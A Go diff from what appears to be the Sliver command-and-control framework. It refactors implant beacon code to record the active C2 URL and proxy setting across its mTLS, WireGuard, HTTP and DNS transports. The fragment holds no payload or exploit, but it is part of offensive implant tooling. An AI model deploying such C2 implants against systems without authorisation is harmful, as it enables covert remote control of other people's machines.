@@ -80,24 +80,8 @@ type Beacon struct {
 	Close   BeaconClose
 	Cleanup BeaconCleanup
 
-	url      *url.URL
-	proxyURL *url.URL
-}
-
-// URL - Returns the c2 URL of the beacon
-func (b *Beacon) URL() string {
-	if b.url == nil {
-		return ""
-	}
-	return b.url.String()
-}
-
-// ProxyURL - Returns the c2 URL of the beacon
-func (b *Beacon) ProxyURL() string {
-	if b.proxyURL == nil {
-		return ""
-	}
-	return b.url.String()
+	ActiveC2 string
+	ProxyURL string
 }
 
 // Interval - Interval between beacons
@@ -215,6 +199,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 
 	var conn *tls.Conn
 	beacon := &Beacon{
+		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
 		},
@@ -262,6 +247,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 	var conn net.Conn
 	var dev *device.Device
 	beacon := &Beacon{
+		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
 		},
@@ -317,9 +303,11 @@ func httpBeacon(uri *url.URL) *Beacon {
 
 	var client *httpclient.SliverHTTPClient
 	var err error
+	opts := httpclient.ParseHTTPOptions(uri)
 	beacon := &Beacon{
+		ActiveC2: uri.String(),
+		ProxyURL: opts.ProxyConfig,
 		Init: func() error {
-			opts := httpclient.ParseHTTPOptions(uri)
 			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
@@ -356,6 +344,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 	var client *dnsclient.SliverDNSClient
 	var err error
 	beacon := &Beacon{
+		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
 			client, err = dnsclient.DNSStartSession(uri.Host, opts)
